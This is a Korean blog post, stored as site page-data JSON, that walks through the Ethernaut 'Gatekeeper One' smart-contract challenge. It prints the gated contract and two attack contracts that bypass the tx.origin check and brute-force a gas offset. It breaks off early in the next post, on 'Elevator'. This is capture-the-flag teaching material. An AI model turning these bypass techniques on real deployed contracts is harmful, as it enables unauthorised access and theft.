{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/ethernaut/13_gatekeeperOne_ethernaut/13_gatekepperOne_1_ethernaut/",
    "result": {"data":{"cur":{"id":"344111be-9d67-5007-8c4f-5ef106e780ac","html":"<h1 id=\"-gatekeeper-one\" style=\"position:relative;\"><a href=\"#-gatekeeper-one\" aria-label=\" gatekeeper one permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Gatekeeper One</h1>\n<p><strong>Difficulty 5/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<p>이번 포스트는 특별하게 2편으로 나누어 진행한다.\r\n이번편은 gate1과 gate2를 다룰 예정이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>Gatekeeper을 지나 entrant로 등록하기</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>GatekeeperOne contract에서스 3개의 gate가 존재한다. gate는 모두 modifier로 되어있다. 즉 3개의 modifier의 조건을 만족시키면 된다.<br>\n분석은 주석에!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">GatekeeperOne</span> <span class=\"token punctuation\">{</span>\r\n\r\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> entrant<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// msg.sender과 tx.origin이 다르면 진행</span>\r\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// gasleft()의 8191의 배수이면 진행</span>\r\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">gasleft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mod</span><span class=\"token punctuation\">(</span><span class=\"token number\">8191</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// _gateKey가 type casting관련 3가지 조건에 만족하면 진행</span>\r\n    <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> \r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part one\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part two\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"GatekeeperOne: invalid gateThree part three\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// modifier를 포함한 함수: 이 함수를 통해 내가 entrant가 될 수 있다.</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">enter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> gateOne gateTwo <span class=\"token function\">gateThree</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        entrant <span class=\"token operator\">=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span>\r\n</code></pre></div>\n<hr>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>이 문제에서 우리의 목표는 3개의 gate를 무사히 지나 entrant로 등록하는 것이다. 우선 gate1은 이전에 풀었던 <a href=\"https://holyhansss.github.io/ethernaut/4_telephone_ethernaut/4_telephone_ethernaut/\">Telephone</a>과 유사했다. 아래의 조건은 우리가 가지고 그냥 내가 직접 transaction을 보내지 않고 다른 contract를 만들어 사용하면 된다. gate1은 쉽게 풀렸다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin <span class=\"token operator\">!=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span></code></pre></div>\n<br/>\n<p>그렇다면 gate2번은 어떻게 pass할 수 있을까? 아래의 코드에서 중요한 점은 gasleft이다. <a href=\"https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html\">gasleft()</a>는 gasleft()가 실행되는 당시의 gas가 얼마나 남았는지 return해주는 함수이다. 그렇다면 어떻게 그 당시 남은 gas를 8191의 배수로 만들 수 있을까?</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">gasleft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mod</span><span class=\"token punctuation\">(</span><span class=\"token number\">8191</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br/>\n<p>이 문제를 완벽히 이해하고 풀기까지 이틀정도 소요된 것 같다ㅜ</p>\n<p>gas 관련 부분에 대한 나의 지식이 부족했던지라 구글을 사용해서 답을 찾아서 이해하는 식으로 진행했다.</p>\n<p>우리는 여기서 reqire문이 실행될때 남은 gas가 8191의 배수가 되게 해야한다. Openzeppline에서 찾은 답은 아래와 같았다. 2번째 gate를 풀기 위해 될때까지 보내는 식인 것 같다. 공부를 마친 후 지금에서 보면 어느정도 이해가 된다. 하지만 내가 문제를 풀 당시에는 아래 코드를 제대로 이해하지 못해 내가 이해할 수 있는 방법으로 문제를 풀었다.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">GatekeeperOneAttack</span> <span class=\"token punctuation\">{</span>\r\n\r\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> GatekeeperOneContractAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">bytes8</span> key <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes8</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">**</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    \r\n    <span class=\"token comment\">// NOTE: the proper gas offset to use will vary depending on the compiler</span>\r\n    <span class=\"token comment\">// version and optimization settings used to deploy the factory contract.</span>\r\n    <span class=\"token comment\">// To migitage, brute-force a range of possible values of gas to forward.</span>\r\n    <span class=\"token comment\">// Using call (vs. an abstract interface) prevents reverts from propagating.</span>\r\n    <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> encodedParams <span class=\"token operator\">=</span> abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"enter(bytes8)\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\r\n      key\r\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// gas offset usually comes in around 210, give a buffer of 60 on each side</span>\r\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">120</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n      <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> result<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>GatekeeperOneContractAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">{</span>gas<span class=\"token punctuation\">:</span> i <span class=\"token operator\">+</span> <span class=\"token number\">150</span> <span class=\"token operator\">+</span> <span class=\"token number\">8191</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>encodedParams<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span>\r\n        <span class=\"token punctuation\">{</span>\r\n        <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\r\n      <span class=\"token punctuation\">}</span>\r\n    <span class=\"token punctuation\">}</span>\r\n  <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br/>\n<p>나는 gate2를 풀때 require문에서 계산되는 시기에 남은 gas의 값을 정확하게 얻어내는 방식으로 진행했다. 여기에서는 remix의 dubugger를 통해 opcode와 그에 대한 정보를 사용했다. 우선 내가 만든 contract는 이랬다. 나는 <a href=\"https://medium.com/coinmonks/ethernaut-lvl-13-gatekeeper-1-walkthrough-how-to-calculate-smart-contract-gas-consumption-and-eb4b042d3009\">이 글</a>에서 방법을 배워 적용했다!</p>\n<br/>\r\n새로운 contract를 만들어 GatekeeperOne.enter()를 call 했다면 gate 1은 성공한 것이다. 그리고 콘솔창을 보면 아래와 같은 transaction 실패표시가 뜰 것이다. 그리고 저 부분을 클릭하고 transaction hash를 찾아 remix debugger에 넣으면 된다.\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 3.888888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAABJ0AAASdAHeZh94AAAAPElEQVQI12PQ0rb/r6Fp+19Ty+6/lrbdf00tWzgG8UFyaurW/3V0Hf9r64DU2oDZIBokp6vnBFYHokF6ANmdH1t19zlFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"gate2_transaction_fail\"\n        title=\"gate2_transaction_fail\"\n        src=\"/static/69efee0e457b1bf6073606bf790ba91e/37523/gate2_transaction_fail.png\"\n        srcset=\"/static/69efee0e457b1bf6073606bf790ba91e/e9ff0/gate2_transaction_fail.png 180w,\n/static/69efee0e457b1bf6073606bf790ba91e/f21e7/gate2_transaction_fail.png 360w,\n/static/69efee0e457b1bf6073606bf790ba91e/37523/gate2_transaction_fail.png 720w,\n/static/69efee0e457b1bf6073606bf790ba91e/ec3e2/gate2_transaction_fail.png 997w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span>\r\n<br/></p>\n<p>이후 debugger를 돌리다보면 아래와 같이 “gasleft().mod” 가 하이라이트 될 때가 있다. 그때 Opcode는 PUSH에 있을 것이고 Step details를 보면 remaining gas를 확인 할 수 있다. 이를 역계산해서 필요한gas만큼 8191의 배수에 더해 transaction을 보내면 된다.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 353px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 26.111111111111107%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABJ0AAASdAHeZh94AAAA5ElEQVQY06XQy06DUBSFYd5Dm0At0MPhJkjLpVAoUNtEjDY6s0468f1f4DdAbZg7+LLWnqzBVsTqAxG9IcIXzLDDCw6Uu0+ipCPL30k2HV7YsDBTtIcV8ytt3ouuPRr7PEIxzITZsuDe3XMna+S6Q9+fUdszs+YL9/VCfrqQnn6ou2+y6kBWHgnDBkvmxPmRdfyMqobDuGK7JdKrsYMWU24RTsXSb0ZejfRrnMcGJ2hx/BrpbG8su88S260QVo6QBYrr75B2gRAbdD1GN5IxJxZTRnKjT7uZDrfSL6va0+DvF//xC+MCnV4FrpT7AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"debuge_gate2\"\n        title=\"debuge_gate2\"\n        src=\"/static/fbbdb7fc0f8bf31077f03a335ff67034/6c115/debug_gateTwo.png\"\n        srcset=\"/static/fbbdb7fc0f8bf31077f03a335ff67034/e9ff0/debug_gateTwo.png 180w,\n/static/fbbdb7fc0f8bf31077f03a335ff67034/6c115/debug_gateTwo.png 353w\"\n        sizes=\"(max-width: 353px) 100vw, 353px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>아래는 내가 해결할때 사용한  코드이다!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">GetEntrant</span> <span class=\"token punctuation\">{</span>\r\n    \r\n    GatekeeperOne gatekeeperOne<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _gatekeeperOne<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        gatekeeperOne <span class=\"token operator\">=</span> <span class=\"token function\">GatekeeperOne</span><span class=\"token punctuation\">(</span>_gatekeeperOne<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    \r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">enter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes8</span> _gateKey<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">//254 gas는 내가 debug를 통해 계산했다.</span>\r\n        gatekeeperOne<span class=\"token punctuation\">.</span>enter<span class=\"token punctuation\">{</span>gas<span class=\"token punctuation\">:</span> <span class=\"token number\">8191</span><span class=\"token operator\">*</span><span class=\"token number\">5</span><span class=\"token operator\">+</span><span class=\"token number\">254</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">(</span>_gateKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n  \r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br/>\r\n너무 길어져서 다음 글에 type conversion 설명과 gate3에 대한 설명을 쓰도록 하겠다:)\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n<li>Storage &#x26; Casting: <a href=\"https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183\">https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183</a></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\"></code></pre></div>","excerpt":"👋 Gatekeeper One Difficulty 5/10 승리 조건 코드 분석 풀이 순서로 진행 될 것이다. 이번 포스트는 특별하게 2편으로 나누어 진행한다.\r\n이번편은 gate1과 gate2를 다룰 예정이다. 승리 조건 Gatekeeper을 지나 entrant로 등록하기 코드 분석 GatekeeperOne contract에서스 3개의 gate가 존재한다. gate는 모두 modifier로 되어있다. 즉 3개의 modifier의 조건을 만족시키면 된다. 분석은 주석에! 풀이 이 문제에서 우리의 목표는 3개의 gate를 무사히 지나 entrant로 등록하는 것이다. 우선 gate1은 이전에 풀었던 Telephone과 유사했다. 아래의 조건은 우리가 가지고 그냥 내가 직접 transaction을 보내지 않고 다른 contract를 만들어 사용하면 된다. gate1은 쉽게 풀렸다. 그렇다면 gate2번은 어떻게 pass할 수 있을까? 아래의 코드에서 중요한 점은 gasleft이다. g…","frontmatter":{"date":"January 17, 2022","title":"(Ethernaut 취약점 13) Gatekeeper One","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/13_gatekeeperOne_ethernaut/13_gatekepperOne_1_ethernaut/"}},"next":{"id":"c6c29b2f-064c-5a3b-8233-859433a422f3","html":"<h1 id=\"-elevator\" style=\"position:relative;\"><a href=\"#-elevator\" aria-label=\" elevator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Elevator</h1>\n<p><strong>Difficulty 4/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>elevator가 top에 갈수 있게 만드는 것이다.</li>\n<li>즉 top 변수를 true로 만들면 된다.</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>분석은 주석에!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">\r\n<span class=\"token comment\">// Building contract interface</span>\r\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Building</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token punctuation\">}</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Elevator</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> top<span class=\"token punctuation\">;</span>\r\n    <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> floor<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// 선택 층으로 올라가는 function</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">goTo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _floor<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">// Building contract에 msg.sender(contract address) 대입</span>\r\n        Building building <span class=\"token 